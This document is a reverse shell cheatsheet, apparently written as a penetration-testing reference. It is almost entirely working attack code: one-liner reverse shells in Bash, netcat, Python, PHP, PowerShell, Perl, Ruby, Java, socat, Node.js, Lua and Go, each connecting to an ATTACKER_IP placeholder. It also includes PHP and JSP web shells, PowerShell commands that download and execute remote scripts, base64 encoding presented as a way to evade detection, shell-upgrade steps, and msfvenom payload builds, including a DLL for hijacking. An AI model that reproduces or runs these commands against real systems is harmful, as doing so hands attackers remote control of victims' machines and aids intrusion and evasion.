# Reverse Shell Cheatsheet

## Listeners
```bash
# Netcat listener
nc -lvnp 4444
ncat -lvnp 4444

# rlwrap (adds readline to nc for arrow keys, history)
rlwrap nc -lvnp 4444

# socat listener
socat TCP-LISTEN:4444,reuseaddr,fork -

# socat encrypted listener
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr,fork -

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"

# pwncat-cs (auto-upgrade, persistence)
pwncat-cs -lp 4444
```

## Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196

exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

## Netcat
```bash
# Traditional netcat (with -e)
nc -e /bin/sh ATTACKER_IP 4444
nc -e /bin/bash ATTACKER_IP 4444

# Netcat without -e (mkfifo method)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Ncat (nmap's netcat)
ncat ATTACKER_IP 4444 -e /bin/bash

# Ncat encrypted
ncat --ssl ATTACKER_IP 4444 -e /bin/bash

# Busybox netcat
busybox nc ATTACKER_IP 4444 -e /bin/sh
```

## Python
```python
# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3 (shorter)
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'

# Python 3 (Windows)
python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",4444));subprocess.call(["cmd.exe"],stdin=s,stdout=s,stderr=s)'
```

## PHP
```php
# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP reverse shell (alternate)
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'

# PHP reverse shell (exec)
php -r '$sock=fsockopen("ATTACKER_IP",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP web shell (upload as .php file)
# <?php system($_GET['cmd']); ?>
# <?php echo shell_exec($_GET['cmd']); ?>
# <?php passthru($_GET['cmd']); ?>
```

## PowerShell
```powershell
# PowerShell reverse shell (one-liner)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded (evade detection)
# Encode on Linux: echo -n 'IEX(...)' | iconv -t utf-16le | base64 -w 0
powershell -nop -enc <BASE64_STRING>

# Download and execute
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"

# PowerShell reverse shell via Invoke-PowerShellTcp (Nishang)
# Host Invoke-PowerShellTcp.ps1 on attacker web server
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
```

## Perl
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER_IP","4444");loop{c.gets.chomp!;(IO.popen(l,"r"){|io|c.print io.read})rescue c.print "failed\n"}'
```

## Java
```java
// Compile and run, or use Runtime.exec in a JSP
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");
p.waitFor();

// JSP web shell
// <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Socat
```bash
# Reverse shell
socat TCP:ATTACKER_IP:4444 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

# Encrypted reverse shell
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```

## Misc Languages
```bash
# Node.js
node -e '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(4444,"ATTACKER_IP",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'

# Lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Golang (compile then run)
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER_IP:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rev.go && go run /tmp/rev.go
```

## Shell Upgrade (TTY)
```bash
# Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# After spawning PTY:
# 1. Background the shell: Ctrl+Z
# 2. On attacker machine:
stty raw -echo; fg
# 3. In the shell:
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 50 columns 200

# script method
script -qc /bin/bash /dev/null

# socat method (requires socat on target)
# Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
# Target:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

# rlwrap (use on attacker with nc)
rlwrap nc -lvnp 4444

# Using expect
/usr/bin/expect -c 'spawn /bin/bash; interact'
```

## msfvenom Payloads
```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# Windows reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o meterp.exe

# PHP
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py

# War (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f asp -o shell.asp

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx

# DLL (for DLL hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o evil.dll
```
